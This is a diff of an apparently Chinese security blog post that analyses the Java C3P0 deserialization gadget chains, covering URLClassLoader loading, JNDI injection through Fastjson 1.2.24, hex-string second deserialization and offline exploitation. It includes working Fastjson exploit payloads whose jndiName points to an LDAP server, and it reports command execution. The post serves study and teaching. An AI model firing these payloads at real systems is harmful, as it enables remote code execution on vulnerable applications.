@@ -322,10 +322,10 @@
 
 <p>最后还有类的加载 ———— <code>instance()</code>，我们的链子尾部就找好了。</p>
 <p>继续往上找，应该是去找谁调用了 <code>ReferenceableUtils.referenceToObject()</code></p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/getObject.png" class>
 
 <p><code>ReferenceIndirector</code> 类的 <code>getObject()</code> 方法调用了 <code>ReferenceableUtils.referenceToObject()</code>，继续往上找</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/WrongGetObject.png" class>
 
 <p><code>PoolBackedDataSourceBase#readObject()</code> 调用了 <code>ReferenceIndirector#getObject()</code>，同时这也正好是一个入口类。</p>
 <p>总结链子流程图如图</p>
@@ -346,32 +346,32 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource) o;</span><br></pre></td></tr></table></figure>
 
 <p>执行 <code>.getObject()</code> 方法的类从原本的 <code>PoolBackedDataSourceBase</code> 变成了 <code>ConnectionPoolDataSource</code>，但是 <code>ConnectionPoolDataSource</code> 是一个接口，并且没有继承 <code>Serializable</code> 接口，所以是无法直接用于代码里面的。</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/ConnectionPoolDataSource.png" class>
 
 <ul>
 <li>这个地方有点卡住了，我们不妨去看一下 <code>PoolBackedDataSourceBase#writeObject()</code> 的时候，也就是序列化的时候做了什么</li>
 </ul>
 <p>如图，直接包装了一层 <code>indirector.indirectForm()</code></p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/indirector.png" class>
 
 <p>我们跟进 <code>indirector.indirectForm()</code> 看一看，当然这个地方的 <code>indirector</code> 实际上就是 <code>com.mchange.v2.naming.ReferenceIndirector</code>，所以语句等价于</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReferenceIndirector.indirectForm()</span><br></pre></td></tr></table></figure>
 
 <p>经过 <code>ReferenceIndirector.indirectForm()</code> 的 “淬炼”，我们直接看返回值是什么</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/ReferenceSerialized.png" class>
 
 <p>这里返回的是 <code>ReferenceSerialized</code> 的一个构造函数，<code>ReferenceSerialized</code> 实际上是一个内部类</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/ReferenceSerializedImplements.png" class>
 
 <p>跟进一下继承的接口</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/IndirectlySerialized.png" class>
 
 <p>发现它继承了 <code>Serializable</code> 接口，至此，包装的过程分析结束。现在我们拿到的 “ConnectionPoolDataSource” 外表上还是 “ConnectionPoolDataSource”，但是实际上已经变成了 “ReferenceSerialized” 这个类；事后师傅们可以自行打断点调试，这样体会的更深刻一些。</p>
 <p>EXP 的编写也较为简单，值得一提的是，这里面有一个 <code>getReference()</code> 方法可以直接 new 一个 Reference 对象。</p>
 <p>通过反射修改 connectionPoolDataSource 属性值为我们的恶意 ConnectionPoolDataSource 类</p>
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/URLClassLoaderSuccess.png" class>
 
-
-<h3 id="C3P0-之-JNDI-注入"><a href="#C3P0-之-JNDI-注入" class="headerlink" title="C3P0 之 JNDI 注入"></a>C3P0 之 JNDI 注入</h3><h4 id="误打误撞看到的一处伪-JNDI-注入，失败告终"><a href="#误打误撞看到的一处伪-JNDI-注入，失败告终" class="headerlink" title="误打误撞看到的一处伪 JNDI 注入，失败告终"></a>误打误撞看到的一处伪 JNDI 注入，失败告终</h4><p>虽然是误打误撞看到的，也是失败的，但是依然有价值。后面看了<a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/" >枫师傅<i class="fas fa-external-link-alt"></i></a>的博客，发现这里居然还是可以利用的，简直太强了。</p>
+<h3 id="C3P0-之-JNDI-注入"><a href="#C3P0-之-JNDI-注入" class="headerlink" title="C3P0 之 JNDI 注入"></a>C3P0 之 JNDI 注入</h3><h4 id="误打误撞看到的一处伪-JNDI-注入，失败告终"><a href="#误打误撞看到的一处伪-JNDI-注入，失败告终" class="headerlink" title="误打误撞看到的一处伪 JNDI 注入，失败告终"></a>误打误撞看到的一处伪 JNDI 注入，失败告终</h4><p>虽然是误打误撞看到的，也是失败的，但是依然有价值。后面看了<a class="link" target="_blank" rel="noopener" href="https://goodapple.top/">枫师傅<i class="fas fa-external-link-alt"></i></a>的博客，发现这里居然还是可以利用的，简直太强了。</p>
 <ul>
 <li>其实是在寻找上一条 Gadget 的时候发现的</li>
 </ul>
@@ -379,9 +379,9 @@
 <p>它的 <code>getObject()</code> 方法里面有 <code>initialContext.lookup()</code></p>
 <p>所以我尝试了一下发现几个问题，虽然是坑吧，但是这个坑我更愿意称之为尝试。</p>
 <p>首先这里，我们如果要触发 JNDI 注入，那么肯定需要控制 <code>contextName</code> 这个属性值，结果好巧不巧，这个属性值是一个类</p>
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/contextName.png" class>
 
-
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/ReferenceSerializedContextName.png" class>
 
 <p>既然是一个类，就不能直接赋给字符串对象，然后我尝试了它接口的实现类，发现不行，只能是自己这个接口；这利用面感觉太小太小了，很难挖；所以我这里就放弃了。</p>
 <ul>
@@ -392,37 +392,37 @@
 <p>挺有意思的一次尝试，哈哈哈哈。</p>
 <h4 id="C3P0-之-JNDI-注入流程分析"><a href="#C3P0-之-JNDI-注入流程分析" class="headerlink" title="C3P0 之 JNDI 注入流程分析"></a>C3P0 之 JNDI 注入流程分析</h4><p>这条链子是基于 Fastjson 链子的，也就是说，是 Fastjson 的某一条链</p>
 <p>我们还是以漏洞发现者的思维去寻找，在库中全局搜索 <code>Jndi</code>，看看是否有收获</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/FindJndi.png" class>
 
 <p>点开第一个试一下，接着在这个类当中找 <code>jndi</code> 关键词，看到了这个方法：<code>dereference()</code></p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/dereference.png" class>
 
 <ul>
 <li>在第 112 行与第 114 行，有非常惹人注目的 <code>ctx.lookup()</code></li>
 </ul>
 <p>这里被 <code>lookup()</code> 的变量是 <code>jndiName</code>，跟进去看一下 <code>jndiName</code> 是什么</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/jndiName.png" class>
 
 <p><code>jndiName</code> 是由 <code>this.getJndiName()</code> 搞来的，跟进看一看 <code>getJndiName()</code> 方法</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/getJndiName.png" class>
 
 <p>这个方法做了一件什么事呢？它判断了拿进来的 <code>jndiName</code> 是不是 <code>Name</code> 的类型，如果是就返回 <code>((Name) jndiName).clone()</code>，若不是就返回 <code>String</code>；回想起我前文挖洞失败的那个经历，不就是因为传参是一个对象所以无法利用吗！</p>
 <p>我这里的运气非常好，第一次找就找到了这个漏洞类</p>
 <p>回到前面，我们看一下 <code>dereference()</code> 方法，是否允许我们传入一个 <code>String</code> 类型的参数</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/dereferenceString.png" class>
 
 <p>至此，链子的尾部已经是没问题的了，向上找可用的地方</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/inner.png" class>
 
 <p>同一个类下的 <code>inner()</code> 方法调用了它，继续往上找</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/setLoginTimeout.png" class>
 
 <p>这里有非常多的 <code>getter/setter</code> 方法，已经是满足作为 fastjson 调用链的条件了，但是对于选择上来说，我们选最简单的 <code>setLoginTimeout()</code> 方法，因为它的传参只需要我们传入一个整数即可。</p>
 <p>我觉得这里已经可以写 EXP 了，但是看到有其他师傅的文章分析的意思是：还要继续向上找，可能是因为这个 <code>JndiRefForwardingDataSource</code> 类是 default 的类，觉得利用面还是不够大吧，我个人觉得从攻击的角度上来说是都可以的，后续在写 EXP 的环节也会把这个写进去。</p>
 <ul>
 <li>如果要继续网上找的话，还有一个是可以利用的类</li>
 </ul>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/JndiRefConnectionPoolDataSource.png" class>
 
 <p>再向上找可能还是可以，还能利用，但已经完全没必要了。因为黑命单加的都是大类，如果简短的链子被 ban 了，再深的链子也是被 ban 的。</p>
 <h4 id="C3P0-之-JNDI-EXP-构造"><a href="#C3P0-之-JNDI-EXP-构造" class="headerlink" title="C3P0 之 JNDI EXP 构造"></a>C3P0 之 JNDI EXP 构造</h4><p>先导入 fastjson 的包，就先导 1.2.24 的吧，因为 1.2.25 版本的 fastjson 当中就已经把 <code>com.mchange</code> 包加入了黑名单里面。</p>
@@ -432,12 +432,12 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIVul;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// JndiRefForwardingDataSource 类的直接 EXP 调用  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiForwardingDataSourceEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:1230/remoteObject\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>因为是 default 作用域的类，所以不可以直接 new，这里我们直接用 fastjson 的方式去调</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/JndiRefForwardingDataSourceSuccess.png" class>
 
 <p><code>JndiRefConnectionPoolDataSource</code> 的 EXP 也大同小异，因为这是个 public 为作用域的类，我们可以先通过这种方式测试一下链子的可用性。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRefConnectionPoolDataSourceTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> PropertyVetoException, SQLException &#123;  </span><br><span class="line">        <span class="type">JndiRefConnectionPoolDataSource</span> <span class="variable">jndiRefConnectionPoolDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiRefConnectionPoolDataSource</span>();  </span><br><span class="line">        jndiRefConnectionPoolDataSource.setJndiName(<span class="string">&quot;ldap://127.0.0.1:1230/remoteObject&quot;</span>);  </span><br><span class="line">        jndiRefConnectionPoolDataSource.setLoginTimeout(<span class="number">1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/JndiRefConnectionPoolDataSourceTestSuccess.png" class>
 
 <ul>
 <li>用 fastjson 打也比较简单</li>
@@ -445,23 +445,23 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRefConnectionPoolDataSourceEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:1230/remoteObject\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>成功</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/JndiRefConnectionPoolDataSourceSuccess.png" class>
 
 <h3 id="C3P0-之-hexbase-攻击利用"><a href="#C3P0-之-hexbase-攻击利用" class="headerlink" title="C3P0 之 hexbase 攻击利用"></a>C3P0 之 hexbase 攻击利用</h3><ul>
 <li>这个点因为之前从来没有接触到过，所以跟着其他师傅的文章学习一下，同时这一种利用方式也是二次反序列化的利用之一。</li>
 </ul>
 <h4 id="C3P0-之-hexbase-流程分析"><a href="#C3P0-之-hexbase-流程分析" class="headerlink" title="C3P0 之 hexbase 流程分析"></a>C3P0 之 hexbase 流程分析</h4><p>这条链子能成立的根本原因是，有一个<br><code>WrapperConnectionPoolDataSource</code> 类，它能够反序列化一串十六进制字符串</p>
 <p>链子首部是在 <code>WrapperConnectionPoolDataSource</code> 类的构造函数中，如图</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/WrapperConnectionPoolDataSource.png" class>
 
 <p>在给 <code>userOverrides</code> 赋值的时候，用的是 <code>C3P0ImplUtils.parseUserOverridesAsString()</code> 这么一个操作，这个方法的作用就是反序列化 <code>userOverride</code> 把它这个 String 类型的东西转为对象。跟进</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/parseUserOverridesAsString.png" class>
 
 <p>它这里把 hex 字符串读了进来，把转码后的结果保存到了 <code>serBytes</code> 这个字节流的数组中，这个字节流是拿去进行 <code>SerializableUtils.fromByteArray()</code> 的操作，值得注意的是，在解析过程中调用了 <code>substring()</code> 方法将字符串头部的 <code>HASM_HEADER</code> 截去了，因此我们在构造时需要在十六进制字符串头部加上 <code>HASM_HEADER</code>，并且会截去字符串最后一位，所以需要在结尾加上一个<code>;</code></p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/fromByteArray.png" class>
 
 <p><code>SerializableUtils#fromByteArray()</code> 调用了 <code>SerializableUtils#deserializeFromByteArray</code>，跟进，看到了反序列化的操作 ———— <code>readObject()</code></p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/deserializeFromByteArray.png" class>
 
 <h4 id="C3P0-之-hexbase-EXP-编写"><a href="#C3P0-之-hexbase-EXP-编写" class="headerlink" title="C3P0 之 hexbase EXP 编写"></a>C3P0 之 hexbase EXP 编写</h4><ul>
 <li>因为我们在链子的第一步的时候，看到传入的参数是 <code>this.getUserOverridesAsString()</code>，所以用 Fastjson 的链子打会很简单。</li>
@@ -476,25 +476,25 @@
 <h4 id="C3P0-之-hexbase-调试分析"><a href="#C3P0-之-hexbase-调试分析" class="headerlink" title="C3P0 之 hexbase 调试分析"></a>C3P0 之 hexbase 调试分析</h4><ul>
 <li>断点位置如图</li>
 </ul>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/debugPoint.png" class>
 
 <p>因为我们第一次 Fastjson 拿进去打的是空，是用来加载的，第二次的 payload 是执行，所以可以直接跳过第一次的加载。</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/FirstNull.png" class>
 
 <p>当第二次 Fastjson 进来的时候，就有了</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/SuccessLoadHex.png" class>
 
 <p>在过了 <code>substring</code> 这一步之后，我们看到前面的：<code>HexAsciiSerializedMap:</code> 都无了，现在加载进来的才是真正的 hex 内容</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/replaceHex.png" class>
 
 <p>接着，把 hex 的内容转化为了 bytes 字节码</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/replaceHex.png" class>
 
 <p>下一步，进行反序列化</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/bytesDeserializeFromByteArray.png" class>
 
 <p>跟进</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/readObjectCalc.png" class>
 
 <p>成功弹出计算器</p>
 <h4 id="C3P0-之-hexbase-另类-EXP-调试分析"><a href="#C3P0-之-hexbase-另类-EXP-调试分析" class="headerlink" title="C3P0 之 hexbase 另类 EXP 调试分析"></a>C3P0 之 hexbase 另类 EXP 调试分析</h4><ul>
@@ -506,20 +506,20 @@
 <ul>
 <li>断点依旧是同一个位置，开始调试</li>
 </ul>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/Strange.png" class>
 
 <p>惊奇的发现，<code>userOverrideAsString</code> 一开始为 null，但是经过一轮之后，变成了 hex；这到底是为什么呢？我们可以去到 <code>WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code> 里面去看一看</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/setUserOverridesAsString.png" class>
 
 <p>不妨在这个地方下个断点，然后调试一下。</p>
 <p>师傅们调试的时候会发现，这个</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/equalBoth.png" class>
 
 <p><code>setUserOverridesAsString()</code> 的运行逻辑大致是这样的，首先把之前为 null 的 <code>userOverridesAsString</code> 赋值给 <code>oldVal</code>，接着判断这两个是否相等，或者是否都为 null，如果不满足这个条件，就把新的值赋给 <code>userOverridesAsString</code>，如图</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/GiveVal.png" class>
 
 <p>后续的过程和前面一样，就不再分析了。</p>
-<h2 id="0x04-C3P0-链子的不出网利用"><a href="#0x04-C3P0-链子的不出网利用" class="headerlink" title="0x04 C3P0 链子的不出网利用"></a>0x04 C3P0 链子的不出网利用</h2><p>这一种攻击方式是向<a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/1749" >枫师傅<i class="fas fa-external-link-alt"></i></a>学到的</p>
+<h2 id="0x04-C3P0-链子的不出网利用"><a href="#0x04-C3P0-链子的不出网利用" class="headerlink" title="0x04 C3P0 链子的不出网利用"></a>0x04 C3P0 链子的不出网利用</h2><p>这一种攻击方式是向<a class="link" target="_blank" rel="noopener" href="https://goodapple.top/archives/1749">枫师傅<i class="fas fa-external-link-alt"></i></a>学到的</p>
 <p>不论是 URLClassLoader 加载远程类，还是 JNDI 注入，都需要目标机器能够出网。</p>
 <p>而加载 Hex 字符串的方式虽然不用出网，但却有 Fastjson 等的相关依赖。那么如果目标机器不出网，又没有 Fastjson 依赖的话，C3P0 链又该如何利用呢？</p>
 <ul>
@@ -541,23 +541,23 @@
 <li>简单调试理解一下。</li>
 </ul>
 <p>先把断点下在 <code>BeanFactory</code> 的 <code>getObjectInstance()</code> 方法下，因为这里是一定被调用到的。</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/BeanFactory.png" class>
 
 <p>此处，我们可以看到之前的调用链，如图</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/FormerChains.png" class>
 
 <p>我们去到 <code>readObject()</code> 方法的地方加一个断点，再重新跑一遍，简单调试一下，我们就可以看到这是一个 URLClassLoader 的链子。</p>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/SeeURLClassLoader.png" class>
 
 <ul>
 <li>此处进行了命令执行的操作</li>
 </ul>
-
+<img src="/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/invoke.png" class>
 
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>C3P0 这条链子分析起来还是不难，建议师傅们可以动手去尝试一个个类看一下，看哪里可能会存在有漏洞。</p>
 <p>同时 C3P0 链的价值也是非常高的，C3P0 的包在实战环境中除CommonsCollections、CommonsBeanutiles 以外遇到最多的 JAR 包，其中一部分 C3P0 是被 <code>org.quartz-scheduler:quartz</code> 所依赖进来的。</p>
-<p>关于前文提到的 **”误打误撞看到的一处伪 JNDI 注入，失败告终”**，后续文章会仔细讲这一片段。对应的有一道例题 <a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/109/challenges#ljctr" >Dest0g3 520迎新赛——ljctr<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/15058285.html" >https://www.cnblogs.com/nice0e3/p/15058285.html<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1411/#toc_urlclassloader" >https://tttang.com/archive/1411/#toc_urlclassloader<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/1749" >https://goodapple.top/archives/1749<i class="fas fa-external-link-alt"></i></a></p>
+<p>关于前文提到的 **”误打误撞看到的一处伪 JNDI 注入，失败告终”**，后续文章会仔细讲这一片段。对应的有一道例题 <a class="link" target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/109/challenges#ljctr">Dest0g3 520迎新赛——ljctr<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/15058285.html">https://www.cnblogs.com/nice0e3/p/15058285.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://tttang.com/archive/1411/#toc_urlclassloader">https://tttang.com/archive/1411/#toc_urlclassloader<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
